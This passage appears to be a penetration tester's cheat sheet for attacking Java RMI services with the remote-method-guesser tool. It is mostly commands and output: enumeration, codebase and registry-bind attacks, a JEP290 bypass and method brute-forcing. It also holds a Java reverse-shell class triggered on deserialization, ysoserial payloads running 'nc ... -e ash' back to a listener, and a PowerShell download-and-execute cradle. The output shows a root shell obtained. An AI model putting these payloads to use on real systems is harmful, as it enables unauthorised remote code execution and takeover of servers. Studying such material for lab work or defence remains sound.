- The _RMI Registry_ (`ObjID = 0`)
- The _Activation System_ (`ObjID = 1`)
- The _Distributed Garbage Collector_ (`ObjID = 2`)


```shell
rmg enum 172.17.0.2 9010
```

### Known Interface

```shell
$ rmg enum 172.17.0.2 1090 | head -n 5
[+] RMI registry bound names:
[+]
[+] 	- jmxrmi
[+] 		--> javax.management.remote.rmi.RMIServerImpl_Stub (known class: JMX Server)
[+] 		    Endpoint: localhost:41695  TLS: no  ObjID: [7e384a4f:17e0546f16f:-7ffe, -553451807350957585]

$ rmg known javax.management.remote.rmi.RMIServerImpl_Stub
[+] Name:
[+] 	JMX Server
[+]
[+] Class Name:
[+] 	- javax.management.remote.rmi.RMIServerImpl_Stub
[+] 	- javax.management.remote.rmi.RMIServer
[+]
[+] Description:
[+] 	Java Management Extensions (JMX) can be used to monitor and manage a running Java virtual machine.
[+] 	This remote object is the entrypoint for initiating a JMX connection. Clients call the newClient
[+] 	method usually passing a HashMap that contains connection options (e.g. credentials). The return
[+] 	value (RMIConnection object) is another remote object that is when used to perform JMX related
[+] 	actions. JMX uses the randomly assigned ObjID of the RMIConnection object as a session id.
[+]
[+] Remote Methods:
[+] 	- String getVersion()
[+] 	- javax.management.remote.rmi.RMIConnection newClient(Object params)
[+]
[+] References:
[+] 	- https://docs.oracle.com/javase/8/docs/technotes/guides/management/agent.html
[+] 	- https://github.com/openjdk/jdk/tree/master/src/java.management.rmi/share/classes/javax/management/remote/rmi
[+]
[+] Vulnerabilities:
[+]
[+] 	-----------------------------------
[+] 	Name:
[+] 		MLet
[+]
[+] 	Description:
[+] 		MLet is the name of an MBean that is usually available on JMX servers. It can be used to load
[+] 		other MBeans dynamically from user specified codebase locations (URLs). Access to the MLet MBean
[+] 		is therefore most of the time equivalent to remote code execution.
[+]
[+] 	References:
[+] 		- https://github.com/qtc-de/beanshooter
[+]
[+] 	-----------------------------------
[+] 	Name:
[+] 		Deserialization
[+]
[+] 	Description:
[+] 		Before CVE-2016-3427 got resolved, JMX accepted arbitrary objects during a call to the newClient
[+] 		method, resulting in insecure deserialization of untrusted objects. Despite being fixed, the
[+] 		actual JMX communication using the RMIConnection object is not filtered. Therefore, if you can
[+] 		establish a working JMX connection, you can also perform deserialization attacks.
[+]
[+] 	References:
[+] 		- https://github.com/qtc-de/beanshooter
```

### Codebaseonly = false
```shell
rmg codebase 172.17.0.2 9010 Shell http://172.17.0.1:8000 --signature reg
```


```java
// Taken from: https://gist.github.com/caseydunham/53eb8503efad39b83633961f12441af0

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.jar.Attributes;
import java.io.Serializable;
import java.io.ObjectInputStream;
import java.rmi.Remote;

public class Shell implements Serializable, Remote
{
    private static int port = 4444;
    private static String cmd = "/bin/ash";
    private static String host = "172.17.0.1";
    private static final long serialVersionUID = 2L;

    private void readObject(ObjectInputStream aInputStream) throws ClassNotFoundException, IOException, Exception
    {
        Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s = new Socket(host,port);
        InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
        OutputStream po = p.getOutputStream(), so = s.getOutputStream();
        while(!s.isClosed()) {

            while(pi.available()>0)
                so.write(pi.read());

            while(pe.available()>0)
                so.write(pe.read());

            while(si.available()>0)
                po.write(si.read());

            so.flush();
            po.flush();
            Thread.sleep(50);

            try {
                p.exitValue();
                break;
            } catch (Exception e){}
        }

        p.destroy();
        s.close();
    }
}
```
### Bind Reg (Add service remotely)

```shell
rmg 10.0.0.1 9010 bind 172.10.10.1:8080 --bound-name jmxrmi --localhost-bypass
```

### RMI registry JEP290
```shell
rmg serial 172.17.0.2 9010 CommonsCollections6 'nc 172.17.0.1 4444 -e ash' --component reg

nc -vlp 4444
```
### RMI registry JEP290 bypass
```shell
rmg serial 10.11.1.73 1100 AnTrinh 192.168.119.201:443 --component reg

rmg listen 192.168.119.201 443 CommonsCollections6 'powershell -exec bypass -c "IEX (New-Object Net.WebClient).downloadString(http://192.168.119.216/s.ps1)"'
```

### RMI ActivationSystem
```shell
rmg  serial 10.11.1.73 1100  CommonsCollections6 'ping -c 192.168.119.201' --component act
```

### Bruteforcing Remote Methods

```shell
$ rmg guess 10.11.1.73 1100
[+] Reading method candidates from internal wordlist rmg.txt
[+] 	752 methods were successfully parsed.
[+] Reading method candidates from internal wordlist rmiscout.txt
[+] 	2550 methods were successfully parsed.
[+]
[+] Starting Method Guessing on 3281 method signature(s).
[+]
[+] 	MethodGuesser is running:
[+] 		--------------------------------
[+] 		[ plain-server2  ] HIT! Method with signature String execute(String dummy) exists!
[+] 		[ plain-server2  ] HIT! Method with signature String system(String dummy, String[] dummy2) exists!
[+] 		[ legacy-service ] HIT! Method with signature void logMessage(int dummy1, String dummy2) exists!
[+] 		[ legacy-service ] HIT! Method with signature void releaseRecord(int recordID, String tableName, Integer remoteHashCode) exists!
[+] 		[ legacy-service ] HIT! Method with signature String login(java.util.HashMap dummy1) exists!
[+] 		[6562 / 6562] [#####################################] 100%
[+] 	done.
[+]
[+] Listing successfully guessed methods:
[+]
[+] 	- plain-server2 == plain-server
[+] 		--> String execute(String dummy)
[+] 		--> String system(String dummy, String[] dummy2)
[+] 	- legacy-service
[+] 		--> void logMessage(int dummy1, String dummy2)
[+] 		--> void releaseRecord(int recordID, String tableName, Integer remoteHashCode)
[+] 		--> String login(java.util.HashMap dummy1)
```

**call :**

```shell
rmg call 172.17.0.2 9010 '"id"' --bound-name plain-server --signature "String execute(String dummy)" --plugin GenericPrint.jar
```

**deserialization attacks :**

```shell
$ rmg serial 172.17.0.2 9010 CommonsCollections6 'nc 172.17.0.1 4444 -e ash' --bound-name plain-server --signature "String execute(String dummy)"
[+] Creating ysoserial payload... done.
[+]
[+] Attempting deserialization attack on RMI endpoint...
[+]
[+] 	Using non primitive argument type java.lang.String on position 0
[+] 	Specified method signature is String execute(String dummy)
[+]
[+] 	Caught ClassNotFoundException during deserialization attack.
[+] 	Server attempted to deserialize canary class 6ac727def61a4800a09987c24352d7ea.
[+] 	Deserialization attack probably worked :)

$ nc -vlp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:45479.
id
uid=0(root) gid=0(root) groups=0(root)
```